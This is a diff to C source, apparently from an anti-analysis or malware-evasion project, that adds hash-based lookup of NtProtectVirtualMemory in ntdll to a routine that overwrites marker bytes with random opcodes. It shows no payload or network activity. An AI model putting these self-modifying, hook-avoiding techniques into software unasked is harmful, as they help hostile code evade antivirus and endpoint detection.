@@ -12,6 +12,9 @@
 #include "Strings.h"
 #include "Obfuscation.h"
 #include "Utilities.h"
+#include "Asm.h"
+#include "Defs.h"
+
 // Some Functionality based on C++ code from GuidedHacking
 
 #define RAND ((((__TIME__[7] - '0') * 1 + (__TIME__[6] - '0') * 10 \
@@ -177,13 +180,37 @@ VOID morphMemory(PBYTE pbyDst, BYTE byLength)
         morphedOpcodes[byOpcodeIt] = rand() % MAXBYTE; // 0xFF
 
     // Change the protection of the memory to allow execution and write the morphed opcodes to memory
-    DWORD dwOldProtect;
+    DWORD dwOldProtect = 0x0;
+
+#if CONFIG_NATIVE
+#if CONFIG_ARCH == x64
+    void *p_ntdll = get_ntdll_64();
+#else
+    void *p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
+    NTSTATUS status;
+    void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32B);
+    NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
+    size_t pbySize = sizeof(MARKER_BYTES);
+
+    // set permissions
+    g_nt_protect_virtual_memory(NtCurrentProcess,&pbyDst,&pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect);
+
+    // patch marker bytes
+    rev_memcpy(pbyDst, morphedOpcodes, byLength);
+
+
+    // Restore the original memory protection
+    g_nt_protect_virtual_memory(NtCurrentProcess,&pbyDst,&pbySize,dwOldProtect,&dwOldProtect);
+
+#else
     VirtualProtect(pbyDst, byLength, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
     rev_memcpy(pbyDst, morphedOpcodes, byLength);
 
     // Restore the original memory protection
     VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect);
+#endif //CONFIG NATIVE
 
     // Free the memory allocated for the morphed opcodes
     free(morphedOpcodes);
